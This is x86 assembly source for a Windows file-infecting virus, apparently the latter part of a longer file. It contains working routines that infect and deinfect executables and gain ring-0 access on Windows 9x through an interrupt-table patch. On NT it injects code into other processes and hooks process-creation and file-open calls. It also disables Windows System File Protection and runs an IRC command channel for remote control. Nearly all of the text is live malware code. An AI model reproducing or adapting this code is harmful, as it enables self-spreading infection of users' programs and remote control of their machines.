; input: none
; output:
;   EAX = IRC socket if available, -1 otherwise
; side effects: none
; remarks: useful only within the virus main thread
get_irc_socket:
	delta edx
	mov  eax, irc_socket[edx]
	ret

; input: none
; output:
;   EAX = pointer to last registered nickname
;         This should never be used unless get_irc_socket != -1
; side effects: none
; remarks: useful only within the virus main thread
get_nick:
	delta edx
	lea  eax, my_nickname[edx]
	ret

; input: none
; output:
;   EAX = pointer to "ASCIILF" channel name
; side effects: none
get_channel:
	delta edx
	lea  eax, irc_channel[edx]
	ret

; input:
;   EAX = pointer to ANSI string with file path
; output:
;   EAX = 1 if the file has been successfully infected,
;         0 if an error occured,
;         -1 if the file is already infected,
;         -2 if another (de)infection is already in progress (try again)
; side effects: virus will try to infect the executable
infect_file:
	push ebp
	push esi
	push edi
	push ebx
	delta ebp
	xchg eax, esi
	call enter_infector
	mov  infector_result[ebp], -2
	jnz  exit_infect_file
	call do_infect_file
exit_infect_file:
	movsx eax, infector_result[ebp]
	call leave_infector
	pop  ebx
	pop  edi
	pop  esi
	pop  ebp
	ret

; input:
;   EAX = pointer to ANSI string with file path
; output:
;   EAX = 1 if the file has been successfully deinfected,
;         0 if an error occured,
;         -1 if the file is not infected with *this* version of virus,
;         -2 if another (de)infection is already in progress (try again)
; side effects: virus will try to deinfect the executable
deinfect_file:
	push ebp
	push esi
	push edi
	push ebx
	delta ebp
	xchg eax, esi
	call enter_infector
	mov  infector_result[ebp], -2
	jnz  exit_infect_file
	call do_deinfect_file
	jmp  exit_infect_file

; input:
;   EAX = IP of the new IRC server
; output:
;   EAX = IP of the current IRC server
; side effects: new connections will be done using the new IP
;               and it will be saved in newly infected files
set_irc_server:
	delta edx
	xchg eax, irc_server_ip[edx]
	ret

; ******************************* 9x-only part *******************************

ring0_entry_point:
	push -1
	push ebx
	push eax
_QueueUserAPC:
	int  20h
	dd   002a0024h
	add  esp, 12
	iretd

kernel_code_9x:				; already in kernel32.dll
	delta edx
	mov  eax, [esp + 4]		; EAX = address of the thread function
	xor  ecx, ecx
	push edx
	push ecx
	push esp
	push ecx
	push ecx
	push eax
	push ecx
	push ecx
	call [CreateThread + edx]
	mov  edx, [esp + 4]
	xchg eax, [esp]
	call [CloseHandle + edx]
	pop  eax
	ret  4

new_GetProcAddress:
	delta eax
	cmp  dword ptr [esp + 4], 0
	jne  return_to_original_GetProcAddress
	cmp  dword ptr [esp + 8], 'NETR'
	jne  return_to_original_GetProcAddress
	lea  eax, virus_request_handler[eax]
	ret  8
return_to_original_GetProcAddress:
	mov  eax, GetProcAddress[eax]
	push edi
	add  eax, 5
	push 22h
	sub  edx, edx
	jmp  eax

unlock_GetProcAddress:
	lea  ecx, [eax + 4100]
	shr  eax, 12
	shr  ecx, 12
	push 20060000h	; or PC_STATIC or PC_USER or PC_WRITEABLE
	sub  ecx, eax
	push 0
	push ecx
	push eax
	push 0001000dh	; _PageModifyPermissions
	call [VxDCall4 + ebp]
	mov  esi, GetProcAddress[ebp]
	ret

w9x_kernel_thread:
	push ebp
	push esi
	push edi
	delta ebp
	mov  eax, GetProcAddress[ebp]
	.if dword ptr [eax] == 2b226a57h
		call unlock_GetProcAddress
		lea  eax, new_GetProcAddress[ebp - 5]
		sub  eax, esi
		mov  [esi + 1], eax			; assemble long
		mov  byte ptr [esi], 0e9h	; JMP instruction
	.endif
	xor  ecx, ecx
	mov  esi, VxDCall4[ebp]		; all VxDCallN are the same routine
	mov  cl, 30
scan_for_callback:
	lodsb
	cmp  al, 2eh				; CS: prefix?
	jne  continue_scanning
	cmp  word ptr [esi], 1dffh	; CALL FAR [xxxxxxxx]?
	jne  continue_scanning
	lea  edi, old_VxDCall_int30_callback[ebp]
	mov  esi, [esi + 2]
	push edi
	mov  VxDCall_int30_call_address[ebp], esi
	movsd
	movsw
	pop  edi
	lea  eax, VxDCall_int30_hook[ebp]
	mov  VxDCall_int30_hook_jmp[ebp], edi	; put old xxxxxxxx into our JMP
	cli
	mov  [esi - 6], eax
	mov  [esi - 2], cs
	sti
	mov  cl, 1
continue_scanning:
	loop scan_for_callback
	jmp  kernel_thread

VxDCall_int30_hook:
	pushad
	delta ebp
	cmp  eax, 002a0010h					; VWIN32_Int21Dispatch?
	jne  exit_VxDCall_int30_hook
	cmp  word ptr [esp + 44], 716ch		; LFN Extended Open/Create?
	jne  exit_VxDCall_int30_hook
	cmp  lock_count[ebp], 0				; is auto-infection locked?
	jg   exit_VxDCall_int30_hook
	call enter_infector
	jnz  w9x_skip_infect_file
	call check_infect_file
w9x_skip_infect_file:
	call leave_infector
exit_VxDCall_int30_hook:
	popad
	jmp  fword ptr cs:[12345678h]
VxDCall_int30_hook_jmp = ($ - 4)

w9x_uninstaller_thread:
	push ebp
	push esi
	push edi
	delta ebp
	mov  eax, VxDCall_int30_call_address[ebp]
	mov  ecx, dword ptr old_VxDCall_int30_callback[ebp]
	mov  dx, word ptr old_VxDCall_int30_callback[ebp + 4]
	cli
	mov  [eax], ecx
	mov  [eax + 4], dx
	sti
	mov  eax, GetProcAddress[ebp]
	call unlock_GetProcAddress
	mov  dword ptr [esi], 2b226a57h
	mov  byte ptr [esi + 4], 0d2h
	mov  terminated[ebp], 1
	push event_handle[ebp]
	call [CloseHandle + ebp]
	pop  edi
	pop  esi
	pop  ebp
	ret  4

; input:
;   EAX = address of thread function
;   EDX = function size - number of bytes to copy (ignored on 9x)
;         If 0, we assume the function is already there
; output:
;   EAX = 1 on success, 0 otherwise
; side effects: function is called in the context of kernel32.dll process
create_kernel_thread:
	push ebp
	sldt cx
	delta ebp
	jcxz nt_create_kernel_thread
	push ebx
	push eax
	push ecx
	sidt fword ptr [esp - 2]
	pop  ebx	; EBX = IDT base
	lea  eax, kernel_code_9x[ebp]
	lea  ecx, ring0_entry_point[ebp]
	cli
	mov  dl, [ecx]	; load the code from swap, better not have crash in R0
	mov  dl, [ecx + (kernel_code_9x - ring0_entry_point) - 1]	; ||
	mov  dx, [ebx + 46]		; get higher word...
	shl  edx, 16
	mov  dx, [ebx + 40]		; EDX = old int 5 handler
	mov  [ebx + 40], cx		; modify
	shr  ecx, 16			; int 5
	mov  [ebx + 46], cx		; vector
	xchg ebx, [esp]
	int  5
	xchg ebx, [esp]
	mov  [ebx + 40], dx		; _QueueUserAPC doesn't change EDX nor EBX
	shr  edx, 16
	mov  [ebx + 46], dx
	sti
	mov  dword ptr _QueueUserAPC[ebp], 2420cdh
	mov  word ptr _QueueUserAPC[ebp + 4], 2ah
	pop  eax
	pop  ebx
	xor  eax, eax
	pop  ebp
inc_eax_and_ret:
	inc  eax
create_kernel_thread_ret:
	ret

; ******************************* NT-only part *******************************

nt_create_kernel_thread:
	cmp  virus_pid[ebp], 0
	je   vrh_error_exit
	push eax
	push esi
	push edi
	xor  ecx, ecx
	xchg esi, edx
	mov  cl, 2
	call set_debug_privilege
	push virus_pid[ebp]
	push 0
	push 2ah	; PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_CREATE_THREAD
	call [OpenProcess + ebp]
	test eax, eax
	push ebx
	jz   nt_ckt_exit
	xchg eax, ebx
	test esi, esi
	jz   nt_already_there
	push 0
	mov  ecx, esp
	push esi
	mov  edx, esp
	push 40h		; PAGE_EXECUTE_READWRITE
	push 1000h		; MEM_COMMIT
	push edx
	push 0
	push ecx
	xor  eax, eax
	push ebx
	mov  al, 11h	; NtAllocateVirtualMemory
	mov  edx, esp
	int  2eh
	add  esp, 28
	pop  edi
	xor  eax, eax
	test edi, edi
	jz   nt_ckt_cleanup
	push eax
	push esp
	push esi
	push dword ptr [esp + 24]
	push edi
	push ebx
	call [WriteProcessMemory + ebp]		; XXX can it ever fail here?
	dec  eax
	jmp  nt_init_kernel_thread
nt_already_there:
	mov  edi, [esp + 12]
	xor  eax, eax
	push ecx
nt_init_kernel_thread:
	push esp
	push eax
	push eax
	push edi
	push eax
	push eax
	push ebx
	call [CreateRemoteThread + ebp]
	xchg eax, [esp]
	call [CloseHandle + ebp]	; returns 1 on success, i.e. valid handle closed
nt_ckt_cleanup:
	push eax
	push ebx
	call [CloseHandle + ebp]
	pop  eax
nt_ckt_exit:
	pop  ebx
	pop  edi
	pop  esi
	pop  ecx
nt_ckt_ret:
	pop  ebp
	ret

set_debug_privilege:
; ... and let us open every process handle. ECX = 2 (on) or 0 (off)
	push ecx
	push eax
	push esp
	push 20h			; TOKEN_ADJUST_PRIVILEGES
	xor  eax, eax
	push -1				; GetCurrentProcess == -1
	mov  al, 7bh		; NtOpenProcessToken
	mov  edx, esp
	int  2eh
	add  esp, 12
	test eax, eax
	pop  edi
	jnz  set_debug_privilege_failed
	sub  esp, 8
	push esp
	push dword ptr [esp]
	pusht 'SeDebugPrivilege'
	push 0
	call [LookupPrivilegeValue + ebp]
	mov  edx, esp
	xor  eax, eax
	mov  dword ptr [edx], 1
	push eax
	push eax
	push eax
	push edx
	push eax
	xor  eax, eax
	push edi
	mov  al, 0bh		; NtAdjustPrivilegesToken
	mov  edx, esp
	int  2eh
	add  esp, 40
	push edi
	call [CloseHandle + ebp]
	ret
set_debug_privilege_failed:
	pop  ecx
	ret

; ECX = address of our function, EAX = address of hooked function
nt_hook_api_remote:
	sub  ecx, 5
	sub  ecx, eax
	push ecx			; | build JMP xxx
	push 0e9000000h		; | on the stack
	lea  edx, [esp + 3]
	push 0
	push 5
	push edx
	push eax
	push ebx
	; WriteProcessMemory ensures necessary page access rights
	call [WriteProcessMemory + ebp]
	pop  eax
	pop  ecx
exit_nt_hook_api_remote:
	ret

; EBX = process handle
nt_infect_process:
	test ebx, ebx
	jz   exit_nt_hook_api_remote
	push 0
	mov  ecx, esp
	push TOTAL_SIZE
	mov  edx, esp
	push 40h		; PAGE_EXECUTE_READWRITE
	; Note: MEM_TOP_DOWN is needed, since we want highest possible
	; addresses. DOS loader probably expects lower ones to be available
	; after calling NtCreateProcess(Ex), because it always fails
	; unless MEM_TOP_DOWN is specified...
	push 101000h	; MEM_TOP_DOWN | MEM_COMMIT
	push edx
	push 0
	push ecx
	xor  eax, eax
	push ebx
	mov  al, 11h	; NtAllocateVirtualMemory
	mov  edx, esp
	int  2eh
	add  esp, 28
	xchg edi, [esp]
	test edi, edi
	jz   exit_nt_infect_process
	lea  eax, entry_point[ebp]
	push 0
	push TOTAL_SIZE
	push eax
	push edi
	push ebx
	call [WriteProcessMemory + ebp]
	mov  eax, NtCreateProcess[ebp]
	lea  ecx, [(new_NtCreateProcess - entry_point) + edi]
	call nt_hook_api_remote
	mov  eax, NtCreateProcessEx[ebp]
	test eax, eax
	jz   nt_try_hook_GetProcAddress
	lea  ecx, [(new_NtCreateProcessEx - entry_point) + edi]
	call nt_hook_api_remote
nt_try_hook_GetProcAddress:
	mov  eax, RtlInitString[ebp]
	lea  ecx, [(new_RtlInitString - entry_point) + edi]
	call nt_hook_api_remote
	mov  eax, NtCreateFile[ebp]
	lea  ecx, [(new_NtCreateFile - entry_point) + edi]
	call nt_hook_api_remote
exit_nt_infect_process:
	mov  eax, edi
	pop  edi
	ret

; for both functions, first argument points to a variable
; that receives new process handle
new_NtCreateProcess:
	xor  eax, eax
	lea  edx, [esp + 4]
	mov  al, 2fh
	int  2eh
	pushad
	delta ebp
	mov  edx, [esp + 36]
	mov  ebx, [edx]
	call nt_infect_process
	popad
	ret  32

new_NtCreateProcessEx:
	xor  eax, eax
	lea  edx, [esp + 4]
	mov  al, 30h
	int  2eh
	pushad
	delta ebp
	mov  edx, [esp + 36]
	mov  ebx, [edx]
	call nt_infect_process
	popad
	ret  36

; dirty trick, we can't hook kernel32.dll from NtCreateProcess(Ex) - it's
; simply not there yet. However, RtlInitString is called by GetProcAddress...
new_RtlInitString:
	delta edx
	mov  eax, [esp]
	sub  eax, GetProcAddress[edx]
	cmp  eax, 50
	jnb  original_RtlInitString
	cmp  dword ptr [ebp + 12], 'NETR'
	jne  original_RtlInitString
	cmp  dword ptr [ebp + 8], 0
	jne  original_RtlInitString
	; return from GetProcAddress
	add  esp, 12
	lea  eax, virus_request_handler[edx]
	pop  edi
	pop  ebx
	leave
	ret  8
original_RtlInitString:
	mov  eax, RtlInitString[edx]
	push edi				; | the instructions
	add  eax, 5
	mov  edi, [esp + 12]	; | we overwrote
	jmp  eax

new_NtCreateFile:
	pushad
	delta ebp
	cmp  lock_count[ebp], 0		; is auto-infection locked?
	jg   original_NtCreateFile
	call enter_infector
	jnz  nt_skip_infect_file
	mov  edx, [esp + 44]		; EDX -> OBJECT_ATTRIBUTES
	lea  eax, file_name_buffer[ebp]
	mov  esi, [edx + 8]			; ESI -> UNICODE_STRING
	cmp  word ptr [esi], 510
	ja   nt_skip_infect_file
	push eax
	push 0ff0000h				; ESP -> ANSI_STRING
	mov  edx, esp
	push 0
	push esi
	push edx
	call [RtlUnicodeStringToAnsiString + ebp]
	pop  ecx
	pop  esi
	.if dword ptr [esi] == '\??\'
		add  esi, 4
	.endif
	call check_infect_file
nt_skip_infect_file:
	call leave_infector
original_NtCreateFile:
	popad
	xor  eax, eax
	lea  edx, [esp + 4]
	mov  al, 25h
	int  2eh
	ret  44

try_disable_sfc:
	test eax, eax
	jz   exit_try_disable_sfc
	xor  ebx, ebx
	mov  edx, eax
	mov  bl, SFC_CODE_LENGTH
	add  edx, [eax + 3ch]
	lea  esi, sfc_code_to_patch[ebp]
	mov  edi, [edx + 268]
	mov  ecx, [edx + 264]
	add  edi, eax
	sub  ecx, ebx
find_sfc_code:
	pushad
	mov  ecx, ebx
	repe cmpsb
	popad
	je   sfc_code_found
	inc  edi
	loop find_sfc_code
	jmp  exit_try_disable_sfc
sfc_code_found:
	add  edi, 15
	push eax
	push esp
	push 40h
	push ebx
	push edi
	call [VirtualProtect + ebp]
	mov  ecx, ExitThread[ebp]
	pop  eax
	sub  ecx, edi
	sub  ecx, 7
	; make the thread go away
	mov  dword ptr [edi], 0e8006ah
	mov  dword ptr [edi + 3], ecx
exit_try_disable_sfc:
	ret

nt_injected_code:
	delta ebp
	.if process_index[ebp] == 4
		pusht 'SFC'
		call [GetModuleHandle + ebp]
		call try_disable_sfc
		pusht 'SFC_OS'
		call [GetModuleHandle + ebp]
		call try_disable_sfc
	.endif
	mov  eax, fs:[18h]
	xor  ecx, ecx
	mov  eax, [eax + 20h]
	mov  cl, 2
	lea  edx, entry_point[ebp]
	mov  virus_pid[ebp], eax
	mov  virus_base[ebp], edx
	call set_debug_privilege
	push ebp
	push esi
	push edi
	jmp  kernel_thread

nt_uninstaller_thread:
	xor  ecx, ecx
	delta ebp
	mov  cl, 5		; make sure we catched them all..
deinfect_processes:
	push ecx
	push 0
	push 2
	call [CreateToolhelp32Snapshot + ebp]
	test eax, eax
	jz   continue_deinfect_processes
	xchg eax, edi
	mov  ecx, 296
	sub  esp, ecx
	mov  [esp], ecx
	push esp
	push edi
	call [Process32First + ebp]
loop_uninstall_everywhere:
	push esp
	push edi
	call [Process32Next + ebp]
	test eax, eax
	jz   deinfect_pass_complete
	push dword ptr [esp + 8]
	push 0
	push 28h	; PROCESS_VM_WRITE | PROCESS_VM_OPERATION
	call [OpenProcess + ebp]
	test eax, eax
	xchg eax, ebx
	jz   loop_uninstall_everywhere
	push 0
	push 25b8h
	mov  eax, esp
	push ecx
	push esp
	push 5
	push eax
	push NtCreateFile[ebp]
	push ebx
	call [WriteProcessMemory + ebp]
	add  esp, 12
	push 0ch
	push 247c8b57h
	mov  eax, esp
	push ecx
	push esp
	push 5
	push eax
	push RtlInitString[ebp]
	push ebx
	call [WriteProcessMemory + ebp]
	add  esp, 12
	push 0
	push 2fb8h
	mov  eax, esp
	push ecx
	push esp
	push 5
	push eax
	push NtCreateProcess[ebp]
	push ebx
	call [WriteProcessMemory + ebp]
	mov  eax, NtCreateProcessEx[ebp]
	add  esp, 12
	test eax, eax
	jz   process_uninfected
	push 0
	push 30b8h
	mov  eax, esp
	push ecx
	push esp
	push 5
	push eax
	push NtCreateProcessEx[ebp]
	push ebx
	call [WriteProcessMemory + ebp]	
	add  esp, 12
process_uninfected:
	push ebx
	call [CloseHandle + ebp]
	jmp  loop_uninstall_everywhere
deinfect_pass_complete:
	add  esp, 296
	push edi
	call [CloseHandle + ebp]
continue_deinfect_processes:
	pop  ecx
	dec  ecx
	jnz  deinfect_processes
	mov  terminated[ebp], 1
	push event_handle[ebp]
	call [CloseHandle + ebp]
	ret

import_names_kernel:
	db 'CreateFileA', 0
	db 'CreateFileMappingA', 0
	db 'CreateProcessA', 0
	db 'CreateRemoteThread', 0
	db 'CreateThread', 0
	db 'CreateToolhelp32Snapshot', 0
	db 'ExitThread', 0
	db 'FreeLibrary', 0
	db 'GetFileAttributesA', 0
	db 'GetFileSize', 0
	db 'GetFileTime', 0
	db 'GetModuleHandleA', 0
	db 'GetTempFileNameA', 0
	db 'GetTempPathA', 0
	db 'LoadLibraryA', 0
	db 'MapViewOfFile', 0
	db 'OpenProcess', 0
	db 'Process32First', 0
	db 'Process32Next', 0
	db 'SetEndOfFile', 0
	db 'SetFileAttributesA', 0
	db 'SetFilePointer', 0
	db 'SetFileTime', 0
	db 'Sleep', 0
	db 'UnmapViewOfFile', 0
	db 'VirtualAlloc', 0
	db 'VirtualProtect', 0
	db 'WriteFile', 0
	db 'WriteProcessMemory', 0

import_names_ntdll:
	db 'NtCreateFile', 0
	db 'NtCreateProcess', 0
	db 'NtCreateProcessEx', 0
	db 'RtlInitString', 0
	db 'RtlUnicodeStringToAnsiString', 0

import_names_winsock:
	db 'closesocket', 0
	db 'connect', 0
	db 'gethostbyname', 0
	db 'recv', 0
	db 'select', 0
	db 'send', 0
	db 'socket', 0
	db 'WSACleanup', 0
	db 'WSAStartup', 0

exports_table:
	dd offset virus_get_version
	dd offset create_kernel_thread
	dd offset infect_file
	dd offset lock_infector
	dd offset shutdown_virus
	dd offset install_irc_hook
	dd offset get_irc_socket
	dd offset get_nick
	dd offset get_channel
	dd offset deinfect_file
	dd offset set_irc_server

NUMBER_OF_EXPORTS = (($ - exports_table) / 4)

; from 29A:
sfc_code_to_patch db 6ah, 01h, 6ah, 01h, 0ffh, 33h, 0ffh, 73h, 04h, 0ffh, 15h
SFC_CODE_LENGTH = ($ - sfc_code_to_patch)

irc_join_cmd db 'JOIN '
irc_channel db IRC_CHAN
IRC_CHANNEL_LEN = ($ - irc_channel)
db 10
IRC_JOIN_CMD_LEN = ($ - irc_join_cmd)

irc_server_ip dd IRC_SERVER

CODE_SIZE = ($ - entry_point)
CRYPTED_SIZE = ($ - crypted_start)

import_addresses_kernel:
	CreateFile dd ?
	CreateFileMapping dd ?
	CreateProcess dd ?
	CreateRemoteThread dd ?
	CreateThread dd ?
	CreateToolhelp32Snapshot dd ?
	ExitThread dd ?
	FreeLibrary dd ?
	GetFileAttributes dd ?
	GetFileSize dd ?
	GetFileTime dd ?
	GetModuleHandle dd ?
	GetTempFileName dd ?
	GetTempPath dd ?
	LoadLibrary dd ?
	MapViewOfFile dd ?
	OpenProcess dd ?
	Process32First dd ?
	Process32Next dd ?
	SetEndOfFile dd ?
	SetFileAttributes dd ?
	SetFilePointer dd ?
	SetFileTime dd ?
	Sleep dd ?
	UnmapViewOfFile dd ?
	VirtualAlloc dd ?
	VirtualProtect dd ?
	WriteFile dd ?
	WriteProcessMemory dd ?

NUMBER_OF_KERNEL_IMPORTS = (($ - import_addresses_kernel) / 4)

import_addresses_ntdll:
	NtCreateFile dd ?
	NtCreateProcess dd ?
	NtCreateProcessEx dd ?
	RtlInitString dd ?					; 2000/XP only
	RtlUnicodeStringToAnsiString dd ?	; 2000/XP only

NUMBER_OF_NTDLL_IMPORTS = (($ - import_addresses_ntdll) / 4)

import_addresses_winsock:
	closesocket dd ?
	connect dd ?
	gethostbyname dd ?
	recv dd ?
	select dd ?
	send dd ?
	socket dd ?
	WSACleanup dd ?
	WSAStartup dd ?

NUMBER_OF_WINSOCK_IMPORTS = (($ - import_addresses_winsock) / 4)

CloseHandle dd ?
CreateEvent dd ?
GetLastError dd ?
GetProcAddress dd ?
InternetGetConnectedState dd ?
LookupPrivilegeValue dd ?
VxDCall4 dd ?

virus_pid dd ?
virus_base dd ?
old_VxDCall_int30_callback dw ?, ?, ?
VxDCall_int30_call_address dd ?
lock_count dd ?
infector_busy dd ?
file_name dd ?
file_attributes dd ?
file_handle dd ?
file_last_write_time dd ?, ?
file_last_access_time dd ?, ?
file_mapping_handle dd ?
file_base dd ?
file_size dd ?
file_increase dd ?
virtual_increase dd ?
event_handle dd ?
random_seed dd ?
my_nickname db 9 dup(?)
process_index db ?
terminated db ?
joined db ?
irc_hook dd ?
server_hostname dd ?
irc_socket dd ?
file_name_buffer db 256 dup(?)
irc_buffer db 512 dup(?)
infector_result db ?

TOTAL_SIZE = ($ - entry_point)

first_generation_host:

ExitProcess proto :dword
invoke ExitProcess, 0

end entry_point